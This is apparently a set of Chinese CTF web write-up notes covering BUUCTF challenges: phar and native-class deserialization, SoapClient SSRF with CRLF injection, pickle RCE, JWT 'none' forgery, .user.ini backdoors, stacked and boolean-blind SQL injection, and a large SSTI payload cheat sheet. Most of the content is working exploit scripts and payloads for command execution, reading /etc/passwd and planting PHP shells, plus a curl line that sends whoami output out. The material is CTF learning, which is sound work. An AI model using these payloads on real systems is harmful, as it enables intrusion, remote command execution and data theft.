                echo "当前引用的是 ".$file;
                require $file;
            }
            
        }
        else{
            die("no permission!");
        }
    }
    ?>
    ```

    代码中给了一个class，怀疑可能是一道反序列化的题目，没有反序列化函数但是又涉及到文件上传，基本可以确定是一道phar反序列化题目。

    反序列化题目一般可用的点主要是各个魔术方法，本题目中两个魔术方法有可能被利用。

2. 解题-非预期解

    1. 非预期解1

        __toString魔术方法被调用了，该方法返回一个文件名，如果存在读取文件的操作，也可能被利用。刚好file_get_contents方法触发了该方法，因此可以通过将Filename参数改为flag的路径来读取flag信息。

        ```php
        if(isset($_FILES['file'])) {
            $uploader = new Uploader();
            $uploader->upload($_FILES["file"]);
            if(@file_get_contents($uploader)){
                echo "下面是你上传的文件：<br>".$uploader."<br>";
                echo file_get_contents($uploader);
            }
        }
        ```

        恰好在Uploader类中存在一个可以直接控制Filename的方法：
        ```php
        if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
            $this->Filename = $_GET['name'];
        }
        ```

        用户可以自己传一个name参数作为Filename，并且过滤也并没有限制读取flag。

        接下来的过程就比较简单了，访问/home.php?file=upload&name=/var/www/html/flag.php，然后随便上传一个符合要求的文件，即可得到flag。

    2. 非预期解2

        这个题，上传的时候并没有过滤PHP，还可以指定上传的文件名。所以，直接上传个PHP文件，即可执行命令。本文传了一个写有phpinfo的文件进行测试，上传的文件为a.php。

        上传的时候url为home.php?file=upload&name=a.php。

        上传后访问根目录下的a.php即可。 

3. 预期解

    预期解应该是对cmd参数的利用

    cmd的利用在destruct魔术方法中，要想利用cmd必须绕过对token的比较。

    ```php
    if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
			$this->Filename = $_GET['name'];
    }
    else{
        $this->Filename = $sandbox.$_SESSION['user'].$ext;
    }

    $this->cmd = "echo '<br><br>Master, I want to study rizhan!<br><br>';";
    $this->token = $_SESSION['user'];
    ```
    根据上述代码，token来自`$_SESSION['user']`,而如果用户不自己传递name的值，则Filename的值中会包含

    `$_SESSION['user']`。因此我们可以先随便上传一个文件，不传递name参数，这样就可以拿到`$_SESSION['user']`。

    exp:
    ```php
    <?php
    error_reporting(0);
    class Uploader{
        public $Filename = 'aaa';
        //可以先用phpinfo等函数测试一下
        public $cmd = 'echo file_get_contents("/var/www/html/flag.php");';
        public $token = 'GXY88cc1f1606f74121a99dd1de5560b585';

    }
    @unlink("phar.phar");
    $phar = new Phar("phar.phar");
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new Uploader();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
    ?>
    ```
    将生成的phar文件上传，利用phar协议访问url即可。

### 类型五-原生类利用

#### 极客大挑战 2020 Greatphp

##### 考点

**PHP原生类利用**

**php反序列化**

**md5()和sha1()对类进行hash 触发__toString方法**

##### 过程

1. 源码

    ```php
    <?php
    error_reporting(0);
    class SYCLOVER {
        public $syc;
        public $lover;
    
        public function __wakeup(){
            if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
                if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
                    eval($this->syc);
                } else {
                    die("Try Hard !!");
                }
            }
        }
    }
    if (isset($_GET['great'])){
        unserialize($_GET['great']);
    } else {
        highlight_file(__FILE__);
    }
    ?>
    ```
    代码中第一个if判断要求原字符串不一样，加密后的密文一样，如果不是在类里面可以直接用数组绕过

    在类里面的话，我们可以使用含有 __toString 方法的php内置类来绕过，用的两个比较多的内置类是 Exception 和Error ，他们之中有一个 __toString 方法,当类被当作字符串处理时，就会调用这个函数，以Error 类为例，我们可控当触发他的__toString 方法时
    
    ```php
    <?php
    $a = new Error("payload",'9');
    echo $a;
    ```
    输出

    ```cmd
    F:\ProgramFiles\php-8.3.4\php.exe D:\desktop\ctf\buu\web\script\php\test.php
    Error: payload in D:\desktop\ctf\buu\web\script\php\test.php:3
    Stack trace:
    #0 {main}
    进程已结束，退出代码为 0
    ```

    会以字符串的形式输出当前报错，包含当前的错误信息，以及他出现错误的行号 3，从而传入Error ("payload",9)中的错误代码 '9' 则没有被输出出来,再来看看如何 绕过md5以及 sha1

    ```php
    <?php
    $a = new Error("payload",'9'); $b = new Error("payload",'0');
    if(md5($a) === md5($b)){
        echo "md5相等" . "\n";
    }

    if(sha1($a) === sha1($b)){
        echo "sha1相等" . "\n";
    }
    ```

    输出：
    ```cmd
    F:\ProgramFiles\php-8.3.4\php.exe D:\desktop\ctf\buu\web\script\php\test.php
    md5相等
    sha1相等
    ```

    由于题目用preg_match过滤了小括号无法调用函数，所以我们尝试直接include "/flag"将flag包含进来即可；由于过滤了引号，于是在这里进行取反，这样解码后就自动是字符串，无需再加双引号或单引号。

    而且eval执行带有完整标签的语句需要先闭合，就类似于将字符串当成代码写入到源码中。

2. payload:

    ```php
    <?php
    class SYCLOVER
    {
        public $syc;
        public $lover;
    }

    $cmd = '/flag';
    $s = urlencode(~$cmd);
    $str = "?><?=include~" . urldecode($s) . "?>";
    $a = new Error($str, 1);$b = new Error($str, 2);
    $c = new SYCLOVER();
    $c->syc = $a;
    $c->lover = $b;
    echo(urlencode(serialize($c)));
    ?>
    ```

#### bestphp's revenge

##### 知识点

**session反序列化->soap(ssrf+crlf)->call_user_func激活soap类**

1. SoapClient触发反序列化导致ssrf
2. serialize_hander处理session方式不同导致session注入
3. crlf漏洞

##### 解题思路

首先，php反序列化没有可利用的类时，可以调用php原生类，参考[反序列化之PHP原生类的利用](https://xz.aliyun.com/t/13785?time__1311=mqmxnQKGqQwx9DBqDTeeqBKMk8IFG87D27eD&alichlgref=https%3A%2F%2Fxz.aliyun.com%2Fsearch%3Fkeyword%3D%25E5%258E%259F%25E7%2594%259F%25E7%25B1%25BB)

```php
//index.php
<?php
highlight_file(__FILE__);
$b = 'implode';
call_user_func($_GET[f],$_POST);
session_start();
if(isset($_GET[name])){
    $_SESSION[name] = $_GET[name];
}
var_dump($_SESSION);
$a = array(reset($_SESSION),'welcome_to_the_lctf2018');
call_user_func($b,$a);
?>
```

```php
//flag.php
session_start();
echo 'only localhost can get flag!';
$flag = 'LCTF{*************************}';
if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){
       $_SESSION['flag'] = $flag;
   }
only localhost can get flag!
```

`f`传入`extract`覆盖b为我们想要的函数，问题是后面session的利用。

先说`SoapClient`，参考[从几道CTF题看SOAP安全问题](https://www.cnblogs.com/20175211lyz/p/11515519.html)

>SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。
其采用HTTP作为底层通讯协议，XML作为数据传送的格式
SOAP消息基本上是从发送端到接收端的单向传输，但它们常常结合起来执行类似于请求 / 应答的模式。

**那么如果我们能通过反序列化调用SoapClient向flag.php发送请求，那么就可以实现ssrf**

接下要解决的问题是：

   - 在哪触发反序列化
   - 如何控制反序列化的内容

这里要知道`call_user_func()`函数如果传入的参数是`array`类型的话，会将数组的成员当做类名和方法，例如本题中可以先用`extract()`将`b`覆盖成`call_user_func()`，`reset($_SESSION)`就是`$_SESSION['name']`，我们可以传入`name=SoapClient`，那么最后`call_user_func($b, $a)`就变成`call_user_func(array('SoapClient','welcome_to_the_lctf2018'))`,即`call_user_func(SoapClient->welcome_to_the_lctf2018)`，由于`SoapClient`类中没有`welcome_to_the_lctf2018`这个方法，就会调用魔术方法`__call()`从而发送请求

控制Soap的内容poc
```php
<?php
$target = "http://127.0.0.1/flag.php";
$attack = new SoapClient(null,array('location' => $target,
    'user_agent' => "N0rth3ty\r\nCookie: PHPSESSID=123456\r\n",
    'uri' => "123"));
$payload = urlencode(serialize($attack));
echo $payload;
```

这里又涉及到crlf，参考[CRLF Injection漏洞的利用与实例分析](https://www.jianshu.com/p/d4c304dbd0af)

>CRLF是”回车(%0d)+换行(%0a)”（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLFInjection又叫HTTPResponseSplitting，简称HRS。

这个poc就是利用crlf伪造请求去访问flag.php并将结果保存在cookie为PHPSESSID=123456的session中。

最后一点，就是如何让php反序列化结果可控。这里涉及到php反序列的机制。

>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。
存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容。
在php.ini中存在三项配置项

```lua
session.save_path=""   --设置session的存储路径
session.save_handler="" --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
session.serialize_handler   string --定义用来序列化/反序列化的处理器名字。默认是php(5.5.4后改为php_serialize)
```

PHP内置了多种处理器用于存储$_SESSION数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式：

|处理器|对应存储格式|
|------|-----------|
|php|键名 + 竖线 + 经过serialize()函数反序列化处理的值|
|php_binary|键名的长度对应的ASCII字符 + 键名 + 经过serialize()函数反序列化处理的值|
|php_serialize(php>=5.5.4)|经过serialize()函数反序列处理的数组|

配置选项 `session.serialize_handler`，通过该选项可以设置序列化及反序列化时使用的处理器。
如果PHP在反序列化存储的`$_SEESION`数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的伪造，甚至可以伪造任意数据。

当存储是`php_serialize`处理，然后调用时php去处理，如果这时注入的数据时`a=|O:4:"test":0:{}`，那么session中的内容是`a:1:{s:1:"a";s:16:"|O:4:"test":0:{}";}`，那么`a:1:{s:1:"a";s:16:"`会被php解析成键名，后面就是一个test对象的注入。

正好我们一开始的`call_user_func`还没用，可以构造`session_start(['serialize_handler'=>'php_serialize'])`达到注入的效果。

##### 解题步骤

1. 写入session
    ```php
    <?php
    $target = "http://127.0.0.1/flag.php";
    $attack = new SoapClient(null, array(
        'location' => $target,
        'user_agent' => "N0rth3ty\r\nCookie: PHPSESSID=817olmp68ukmnofc2mlp762ql0\r\n",
        'uri' => "123"
    ));
    $payload = urlencode(serialize($attack));
    echo $payload;
    ```

    生成payload，然后在前面加个|
    ```uri
    ?name=|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A56%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3D817olmp68ukmnofc2mlp762ql0%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&f=session_start

    POST:
    serialize_handler=php_serialize
    ```
2. 触发反序列化使SoapClient发送请求
    ```uri
    ?f=extract

    POST:
    b=call_user_func
    ```
3. 修改cookie

将cookie修改成第一步中poc中设置的值发起请求拿到flag。

## python反序列化

### CISCN2019华北赛区 Day1 Web2 ikun(JWT python反序列化)

[另一道和jwt有关的题](#hfctf2020easyloginjwt伪造)

1. 进来看到提示购买lv6，直接翻页找不到,翻页时发现url里有页面索引,直接脚本跑

    ```python
    url = 'http://4a471f3e-6f7e-46ab-a7b3-0dec29398943.node5.buuoj.cn:81/shop?page='
    for i in range(600):
        urls = url + str(i)
        res = requests.get(urls)
        if 'lv6.png' in res.text:
            print('lv6 in ' + str(i) +' page\n')
            break
    ```

2. lv6在181页，注册账号购买，钱不够，bp抓包，发现有折扣信息，修改折扣
3. 进入一个新的页面`/b1g_m4mber`,提示只能由admin访问，抓包发现请求头里面有JWT(JSON Web Token,用于身份认证)，用`c-jwt-cracker`破解密钥
    ```bash
    ./jwtcrack 密文
    ```

    得到密钥后，需要生成新的jwt，这时可以用brup的JSON Web Token(修改JWT之后，会自动修改抓取数据包中的JWT),将用户名改为admin，放行，成功访问，查看网页源码发现了压缩包

4. 题目一开始也提示了python 和 pickle，即python的反序列化漏洞，
   
   关于pickle

    ```text
    1. 持续化模块：就是让数据持久化保存。

    pickle模块是Python专用的持久化模块，可以持久化包括自定义类在内的各种数据，比较适合Python本身复杂数据的存贮。
    但是持久化后的字串是不可认读的，并且只能用于Python环境，不能用作与其它语言进行数据交换。

    2. pickle 模块的作用

    把 Python 对象直接保存到文件里，而不需要先把它们转化为字符串再保存，也不需要用底层的文件访问操作，直接把它们写入到一个二进制文件里。pickle 模块会创建一个 Python 语言专用的二进制格式，不需要使用者考虑任何文件细节，它会帮你完成读写对象操作。用pickle比你打开文件、转换数据格式并写入这样的操作要节省不少代码行。

    3. 主要方法
    在pickle中dumps()和loads()操作的是bytes类型，而在使用dump()和lload()读写文件时，要使用rb或wb模式，也就是只接收bytes类型的数据。
    dumps(): 写
    loads(): 读
    loads() 和 dumps() 操作对象都是string
    load() 和 dump() 操作对象都是文件
    ```

    漏洞在admin.py文件中。

    ```python
    import tornado.web
    from sshop.base import BaseHandler
    import pickle
    import urllib


    class AdminHandler(BaseHandler):
        @tornado.web.authenticated
        def get(self, *args, **kwargs):
            if self.current_user == "admin":
                return self.render('form.html', res='This is Black Technology!', member=0)
            else:
                return self.render('no_ass.html')

        @tornado.web.authenticated
        def post(self, *args, **kwargs):
            try:
                become = self.get_argument('become')
                p = pickle.loads(urllib.unquote(become))
                return self.render('form.html', res=p, member=1)
            except:
                return self.render('form.html', res='This is Black Technology!', member=0)
    ```

    借用别人的wp：
    
    思路是我们构建一个类，类里面的`__reduce__`魔术方法会在该类被反序列化的时候会被调用,而在`__reduce__`方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码.

    破解脚本。

    ```python
    import pickle
    import urllib
    import commands
    
    
    class payload(object):
        def __reduce__(self):
            return (commands.getoutput,('cat /flag.txt',))
            # return(commands.getoutput,('ls /'))
            # return (eval, ("open('/flag.txt','r').read()",))
    
    
    a = pickle.dumps(payload())
    a = urllib.quote(a)
    print(a)
    ```

    得到payload后，利用bp修改become的值为payload

    *注意 : 每次发送请求都要将jwt中的username改为admin*

## HFCTF2020EasyLogin(JWT伪造)

**考点**
- JS代码审计
- jwt漏洞破解

1. 查看网页源码，发现有个app.js,之所以注意到这个，是因为它和其他的js脚本位置不一样，感觉不像是普通的js脚本。在网络选项卡中有个与app.js有关的请求。双击就能看到app.js源码。
2. 根据源码提示，这道题采用了koa框架

    koa项目文件框架
    ```lua
    |-- root
    |   |-- app
    |   |   |-- controllers  //控制器业务逻辑
    |   |   |   |-- xx.js
    |   |   |   |-- xx.js
    |   |   |-- routes
    |   |   |   |-- xx.js
    |   |   |   |-- xx.js
    |   |   |-- node_moudles  //各个功能实现代码
    |   |   |   |-- xx.js
    |   |   |   |-- xx.js
    ```
    按照koa框架的常见结构去获取下控制器文件的源码。

    `/controllers/api.js`

    `/api/flag`路径校验为admin用户时才会返回flag，而登录验证方式采用的是JWT，所以可以尝试对JWT进行破解修改。，并且生成JWT是用HS256加密，可以把它改为`none`来进行破解。标题中的`alg`字段更改为`none`，有些JWT库支持无算法，即没有签名算法。当alg为none时，后端将不执行签名验证。 此外对于本题中验证采用的密匙`secret`值也需要为空或者`undefined`否则还是会触发验证，所以将JWT中`secretid`项修改为`[]`。

    综上所述，一共要修改三个地方：

    - 第一个是username，修改为admin

    - 第二个是alog，修改为none

    - 第三个是secretid，修改为[]

    首先，要获取自己的jwt值，需要用burpsuite登录抓包

    然后复制authorization后面的内容，也就是自己的jwt,可以用bp的jwt插件解码，获取自己的jwt值，生成新的jwt，JWT前两部分都是base64加密，加密脚本如下：

    ```python
    # 这种方式需要把'='去掉，然后加'.'最后把两个值拼在一起
    import base64

    header = '{"alg":"none","typ":"JWT"}'
    payload = '{"secretid":[],"username":"admin","password":"aaa","iat":1713526181}'

    print(base64.b64encode(header.encode('utf-8')))
    print(base64.b64encode(payload.encode('utf-8')))
    # 或
    # 这种方式需要提前安装jwt库
    import jwt

    token = jwt.encode(
    {
    "secretid": [],
    "username": "admin",
    "password": "123",
    "iat": 1662825424  # 在burpsuite里拿到的jwt里的iat值。
    },
    algorithm="none",key="").encode(encoding='utf-8')
    
    print(token)
    ```

    得到新的token后重新赋值给authorization，放包，返回浏览器,点那个获取flag的按钮会发送一个flag的请求，网络选项卡相应里面有flag，或者可以直接访问/api/flag也能拿到。

    *这里要注意username和password要和新生成的jwt中的一致*

## SUCTF2019 CheckIn(文件上传漏洞)

[文件上传漏洞与WAF绕过](https://blog.csdn.net/weixin_39190897/article/details/85334893)

[.user.ini文件构成的PHP后门](https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html)

```ini
    GIF89a
    auto_prepend_file=[木马文件名称]
```

- 注意！！！

这种方式用蚁剑连接时，url地址应该是网站最初存在的php文件名称，而不是上传的木马

## GXYCTF Babysqli(MD5绕过+union联合查询创建虚拟表)——两种绕过方法

1. **联合注入有个技巧。在联合查询并不存在的数据时，联合查询就会构造一个 虚拟的数据。**

    即可以通过union联合查询构造一条数据`1' union select 1,'admin','202cb962ac59075b964b07152d234b70'#`(202cb962ac59075b964b07152d234b70为123 MD5加密值，因为题目中把"()"过滤了，所以不能md5()函数)，从而达到混淆admin用户密码

2. **利用md5函数无法处理数组**

    利用bp抓包，然后更改包中内容`1' union select 1,'admin',NULL#&pw[]=123`

## GYCTF2020 Blicklist(堆叠注入)

```sql
    show databases;   --获取数据库名
    show tables;  --获取表名
    show columns from `table_name`; --获取列名
```

- 堆叠注入-解法一(更改表名，将当前查询表名改成想要查询的表名，同时也要更改表内字段名称为当前表的字段名)

```sql
    -1''; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#

```

- 堆叠注入-解法二(将查询语句进行16进制编码)

  1. select被过滤了，所以先将select * from ` 1919810931114514 `进行16进制编码,payload如下

    ```sql
        ;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#
    ```

  - prepare…from…是预处理语句，会进行编码转换。
  - execute用来执行由SQLPrepare创建的SQL语句。
  - SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。

- 堆叠注入-解法三(handler句柄)

    ```code
        HANDLER ... OPEN语句打开一个表，使其可以使用后续HANDLER ... READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER ... CLOSE或会话终止之前不会关闭
    ```

    payload:

    ```sql
    -1';handler `FlagHere` open as `a`; handler `a` read next;#
    ```

    ```sql
        HANDLER tbl_name OPEN [ [AS] alias]
 
        HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)
            [ WHERE where_condition ] [LIMIT ... ]
        HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
            [ WHERE where_condition ] [LIMIT ... ]
        HANDLER tbl_name READ { FIRST | NEXT }
            [ WHERE where_condition ] [LIMIT ... ]
        
        HANDLER tbl_name CLOSE
    ```

## [CISCN2019 华北赛区 Day2 Web1]Hack World(bool盲注)

用bp fuzz测试或者其他方法，发现大部分关键字都被过滤了,所以考虑bool盲注
利用python脚本解出flag。

```python
    #buuctf web Hack World
    import requests
    import time
    
    
    url = "http://e08be384-4242-4180-bb44-7154471f1dc2.node5.buuoj.cn:81/index.php"
    flag = ""
    i = 0
    
    
    while True:
        i = i + 1
        letf = 32
        right = 127
        while letf < right:
            mid = (letf+right) // 2
            payload = f"if(ascii(substr((select(flag)from(flag)),{i},1))>{mid},1,2)"  # 第一种解法(if判断)
            # payload = f"0^(ascii(substr((select(flag)from(flag)),{i},1))>{mid})"  # 第二种解法(异或)
            data = {"id":payload} 
            res = requests.post(url=url, data=data).text
            time.sleep(0.005)
            if "Hello" in res:
                letf = mid + 1
            else:
                right = mid
        if letf != 32:
            flag += chr(letf)
        else:
            break
    print(flag)
```

## [RoarCTF 2019]Easy Java(java 配置文件泄露)

### WEB-INF知识点

WEB-INF是java的WEB应用的安全目录，此外如果想在页面访问WEB-INF应用里面的文件，必须要通过web.xml进行相应的映射才能访问。

其中敏感目录举例：

```java
    /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则
    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在.jar文件中
    /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
    /WEB-INF/src/：源码目录，按照包名结构放置各个java文件
    /WEB-INF/database.properties：数据库配置文件
```

访问方式

```xml
    <servlet-class>  这个就是指向我们要注册的servlet 的类地址, 要带包路径

    <servlet-mapping>  是用来配置我们注册的组件的访问路径,里面包括两个节点
    一个是<servlet-name>，这个要与前面写的servlet一致
    另一个是<url-pattern>，配置这个组件的访问路径

    <servlet-name> 这个是我们要注册servlet的名字,一般跟Servlet类名有关

    举个例子
    <servlet>
        <servlet-name>FlagController</servlet-name>
        <servlet-class>com.wm.ctf.FlagController</servlet-class>
    </servlet>
```

servlet包含了路径信息，我们尝试包含一下FlagController所在路径，不过这次要在前面加上classes来访问来访问class文件目录（详见上面的目录结构），且文件后缀为.class

这道题需要将请求方式改为POST，GET方式得不到想要的东西

## SSTI(服务端模板注入)

### SSTI payload:

[SSTI 服务器端模板注入(Server-Side Template Injection)](https://www.cnblogs.com/bmjoker/p/13508538.html)

[关于SSTI注入](https://xz.aliyun.com/t/11090?time__1311=mqmx0DyDuDBGuD0vo4%2BxaLm44iq40KqG8eD&alichlgref=https%3A%2F%2Fwww.google.com%2F)

smarty

```php
    {if phpinfo()}{/if}
    {if readfile(‘文件路径’)}{/if}
    {if show_source(‘文件路径’)}{/if}
    {if passthru(‘操作命令’)}{/if}
    {if system(‘操作命令’)}{/if}
```

Jinja2

```python
__class__         返回调用的参数类型
__bases__         返回基类列表
__mro__           此属性是在方法解析期间寻找基类时的参考类元组
__subclasses__()  返回子类的列表
__globals__       以字典的形式返回函数所在的全局命名空间所定义的全局变  量 与 func_globals 等价
__builtins__      内建模块的引用，在任何地方都是可见的(包括全局)，每个 Python 脚本都会自动加载，这个模块包括了很多强大的 built-in 函数，例如eval, exec, open等等
```


```python
    # Jinja2
    获得基类
    #python2.7
    ''.__class__.__mro__[2]
    {}.__class__.__bases__[0]
    ().__class__.__bases__[0]
    [].__class__.__bases__[0]
    request.__class__.__mro__[1]
    #python3.7
    ''.__class__.__mro__[1]
    {}.__class__.__bases__[0]
    ().__class__.__bases__[0]
    [].__class__.__bases__[0]
    request.__class__.__mro__[1]

    #python 2.7

    ## 文件操作
    # 找到file类
    [].__class__.__bases__[0].__subclasses__()[40]
    # 读文件
    [].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
    # 写文件
    [].__class__.__bases__[0].__subclasses__()[40]('/tmp').write('test')

    ## 命令执行

    # 下方payload中 '__init__'前面的都可以换成a,b,c...

    # os执行

    lipsum.__globals__['os'].popen('ls').read()

    # 利用warnings.catch_warnings类
    # [].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：
    # popen('id')中的id可换成其他Linux命令
    [].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()
    #eval,impoer等全局函数
    #[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__ 下有eval，__import__等的全局函数，可以利用此来执行命令：
    [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
    # 字符拼接绕过关键字过滤
    [].__class__.__bases__[0].__subclasses__()[59].__init__['__glo'+'bals__'].__builtins__.eval("__import__('os').popen('id').read()")
    [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
    [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()

    # 逆序绕过关键字过滤
    {{config.__init__['__slabolg__'[::-1]]['os'].ponen('ls').read()}}
    
    # 利用site._Printer类
    [].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()

    # 利用subprocess.Popen
    [].__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()

    #python3.7
    #命令执行
    {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
    #文件操作
    {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
    #windows下的os命令
    "".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()
```

**关于subprocess.Popen**

subprocess这个模块是用来产生子进程，然后可以连接到这个子进程传入值并获得返回值

subprocess中的Popen类，这个类中可以传入一些参数值

```python
class subprocess.Popen( 
 args,						# 字符串或者列表，表示要执行的命令如：
    subprocess.Popen(["cat","test.txt"]) # 或
    subprocess.Popen("cat test.txt", shell=True)
 bufsize=0,					# 缓存大小，0无缓冲，1行缓冲
 executable=None,			# 程序名，一般不用
 stdin=None,				# 子进程标准输入
 stdout=None,				# 输出
 stderr=None,				# 错误
 preexec_fn=None,
 close_fds=False,
 shell=False,				# 为ture的时候，unix下相当于args前添加了一个 /bin/sh -c
   							#				window下相当于添加 cmd.exe /c
 cwd=None,					# 设置工作目录
 env=None,					# 设置环境变量
 universal_newlines=False,	# 各种换行符统一处理成 \n
 startupinfo=None,			# window下传递给createprocess的结构体
 creationflags=0)			# window下传递create_new_console创建自己的控制台窗口
```

**关于Popen.communicate()**

communicate()：和子进程交互，发送和读取数据

    使用 subprocess 模块的 Popen 调用外部程序，如果 stdout 或 stderr 参数是 pipe，

    并且程序输出超过操作系统的 pipe size时，如果使用 Popen.wait() 方式等待程序结束获取返回值，会导致死锁，程序卡在 wait() 调用上

    ulimit -a 看到的 pipe size 是 4KB，那只是每页的大小，查询得知 linux 默认的 pipe size 是 64KB。

    使用 Popen.communicate()。这个方法会把输出放在内存，而不是管道里，

    所以这时候上限就和内存大小有关了，一般不会有问题。而且如果要获得程序返回值，

    可以在调用 Popen.communicate() 之后取 Popen.returncode 的值。


**Jinja2一些绕过WAF姿势**

过滤 "["

```python
    #getitem、pop
    ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
    ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()
```

过滤引号

```python
    #chr函数
    {% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
    {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()}}#request对象
    {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&path=/etc/passwd
    #命令执行
    {% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
    {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }}
    {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&cmd=id
```

过滤下划线

```python
    {{''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__
```

过滤花括号

```python
    #用{%%}标记
    {% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
```

过滤class,subclass等关键字:可以用request.args绕过

```python
[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()?a=__class__&b=__mro__&c=__subclasses__&d=read
```

Twig

```php
    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}} # 其中id可以更换为系统命令
    {{'/etc/passwd'|file_excerpt(1,30)}}

    {{app.request.files.get(1).__construct('/etc/passwd','')}}

    {{app.request.files.get(1).openFile.fread(99)}}

    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}

    {{_self.env.enableDebug()}}{{_self.env.isDebug()}}

    {{["id"]|map("system")|join(",")}}

    {{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}

    {{["id",0]|sort("system")|join(",")}}

    {{["id"]|filter("system")|join(",")}}

    {{[0,0]|reduce("system","id")|join(",")}}

    {{['cat /etc/passwd']|filter('system')}}
```

### WesternCTF2018 shrine

    源码

  ```python
    import flask
    import os
    app = flask.Flask(__name__)
    app.config['FLAG'] = os.environ.pop('FLAG')
    
    //显示代码
    @app.route('/')
    def index():
        return open(__file__).read()
    
    
    @app.route('/shrine/')
    def shrine(shrine):
        def safe_jinja(s):
            s = s.replace('(', '').replace(')', '')
            blacklist = ['config', 'self']
            return ''.join(['{{% set {}=None%}}'.format(c)for c in blacklist]) + s
        return flask.render_template_string(safe_jinja(shrine))
    
    if __name__ == '__main__':
    app.run(debug=True)
  ```

  ```python
    os  python   # 文件目录方法模块，用来处理文件和目录
    os.environ   # os模块环境变量
